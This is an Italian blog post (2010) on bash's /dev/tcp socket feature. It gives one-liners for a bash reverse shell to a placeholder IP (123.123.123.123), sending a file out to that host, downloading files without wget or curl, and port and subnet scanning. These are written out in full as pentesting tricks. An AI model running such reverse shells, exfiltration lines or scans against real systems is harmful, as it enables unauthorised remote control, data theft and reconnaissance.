---
comments: true
date: 2010-07-03 18:08:30
layout: post
slug: bash-networking-tricks
title: Bash networking tricks
wordpress_id: 652
categories:
- How to
- Networking
- Pentesting
- Security
- Shell
- Snippets
tags:
- bash
- networking
- shell
- Tricks
---

Un articolo dell'ottimo [voipandhack.it](http://www.voipandhack.it/archives/linux/bash-socket-programming) mi ha fatto conoscere una _feature_ di bash che permette di aprire socket verso host remoti. In rete si trovano interessanti utilizzi di questa tecnica, da semplici browser per scaricare file via HTTP, a trasferimenti di file via rete, a reverse shell e port scanner senza l'utilizzo di alcun programma esterno. Solo una pura e semplice shell bash.

Proviamo ad analizzare qualche linea di codice utile da dare in pasto alla nostra shell, e per capire il funzionamento effettuiamo una richiesta HTTP verso il server Google direttamente con la nostra bash

```bash
utente@linux:~$ exec 5<>/dev/tcp/www.google.com/80
utente@linux:~$ echo -e "GET / HTTP/1.0nn" >&5
utente@linux:~$ cat <&5
HTTP/1.0 302 Found
Location: http://www.google.it/
....
```



Nella prima riga il comando `exec` [redirige](http://tldp.org/LDP/abs/html/x17601.html) l'input e l'output (`<>`) del file `/dev/tcp/www.google.com/80` sul file descriptor numero 5. Quindi scrivendo e leggendo su questo file descriptor come si fa normalmente con i vari standard input/output/error, possiamo inviare e ricevere stringhe sulla porta 80 di google.com. Alla path `/dev/tcp/www.google.com/80` non corrisponde un vero file: bash intercetta la chiamata e apre un socket verso l'host. E' possibile comunicare anche su udp sostituendolo nella finta path al posto di _tcp_.

### Reverse shell

La prima cosa che mi è venuta in mente quando ho letto di questa tecnica, è stata la possibile implementazione di una reverse shell compatta, scritta con poche righe e utilizzabile senza bisogno di programmi esterni come nc, o ssh e telnet. Su GNUCITIZEN riportano una ottima [soluzione](http://www.gnucitizen.org/blog/reverse-shell-with-bash/) su come implementare una reverse shell che si connetta a una porta remota in attesa di comandi da eseguire. Sulla nostra macchina, apriamo una porta con netcat, naturalmente raggiungibile dall'esterno a un certo ip pubblico, con il comando

```bash
utente@client:~$ nc -l -p 9009
```

Sulla macchina remota istruiamo bash per connettersi al nostro IP, che supponiamo sia 123.123.123.123, alla porta 9009 da cui impartiremo i comandi alla shell

```bash
utente@server:~$ exec 5<>/dev/tcp/123.123.123.123/9009
utente@server:~$ cat <&5 | while read line; do $line 2>&5 >&5; done
```

Ogni comando scritto nel netcat della nostra macchina _client_ verrà eseguito sulla macchina _server_, e verrà restituito l'output al client. Funziona che è una meraviglia.

### Download di file via HTTP

Questa feature di bash viene in soccorso quando desideriamo scaricare un file su una macchina remota, ma non disponiamo di wget, curl, lynx, e utility simili. Con [questa](http://www.pebble.org.uk/linux/bashbrowser) semplice stringa

```bash
utente@linux:~$ (echo -e "GET /index.html HTTP/0.9rnrn" 1>&3 & cat 0<&3) 3<>/dev/tcp/www.google.it/80 | (read i; while [ "$(echo $i | tr -d 'r')" != "" ]; do read i; done; cat) > index.html`
```



Il file `/index.html` verrà scaricato dal web server `www.google.it:80` e salvato nel file locale `index.html`. Scarica senza problemi qualsiasi tipo di file, compresi binari, archivi etc. Naturalmente non sono gestiti errori, redirect, e non utilizza i parametri Host o User-Agent, ma comunque dovrebbe bastare per una richiesta HTTP semplice. Eventuali parametri necessari possono essere facilmente aggiunti alla stringa che contiene il GET.

### Trasferimento file da e verso un server remoto

Può servire come metodo per trasferire file da una macchina all'altra, nel caso il server non possieda tool o demoni per il trasferimento di file come ftp, scp, eccetera. Per **inviare un file verso il server remoto**, redirigiamo il contenuto del file `file_to_send` al comando netcat, che apre sulla nostra macchina una porta in attesa

```bash
utente@client:~$ cat file_to_send | nc -l -p 9009
```

Sulla macchina remota che deve ricevere il file eseguiamo il comando

```bash
utente@server:~$ bash -i >& /dev/tcp/123.123.123.123/9009 0>&1 > file_received
```

In questo modo il `server` si connette alla porta 9009 e legge il file `file_to_send`, che viene quindi duplicato sulla macchina remota. In maniera simile è possibile **prelevare un file dal server remoto**. Utilizziamo netcat per aprire una porta in attesa sulla nostra macchina, il cui input sarà rediretto verso il file `received_file`

```bash
utente@client:~$ nc -l -p 9009 > received_file
```

Con un banale comando `echo` iniettiamo successivamente il file `file_to_send` verso la porta che abbiamo aperto sulla nostra macchina

```bash
utente@server:~$ cat file_to_send > /dev/tcp/123.123.123.123/9009
```

### Port scanning

L'articolo su [voipandhack.it](http://www.voipandhack.it/archives/linux/bash-socket-programming) spiega come fare un semplice port scanner con la tecnica del /dev/tcp. Ho modificato leggermente il codice, ma il comando da utilizzare è

```bash
utente@client:~$ h="192.168.1.1"; for p in {0..1024}; do (echo >/dev/tcp/$h/$p) >/dev/null 2>&1 && echo "$h:$p"; done
192.168.1.1:80
192.168.1.1:443
```

Effettua un port scanning su l'host specificato nella variabile $h, dalla porta 0 alla porta 1024. Una variazione interessante può essere lo **scanning della sottorete** alla ricerca di una porta che accetta le connessioni

```bash
utente@server:~$ n="192.168.1."; p=80; for h in {0..255}; do (echo >/dev/tcp/$n$h/$p) >/dev/null 2>&1 && echo -e "n192.168.1.$h:$p" || echo -n "."; done
.
192.168.1.1:80
..........................................
192.168.1.56:80
.......................
192.168.1.98:80
................................................................................................................
```


Come vedete questa linea di bash enumera tutti i computer della sottorete definita in $n che hanno la porta $p aperta. E' un utile strumento per vedere le macchine che accettano connessioni nella propria lan, o nella lan di una macchina remota che non possiede nmap o strumenti simili.

Happy bashing, qualunque cosa voglia dire.
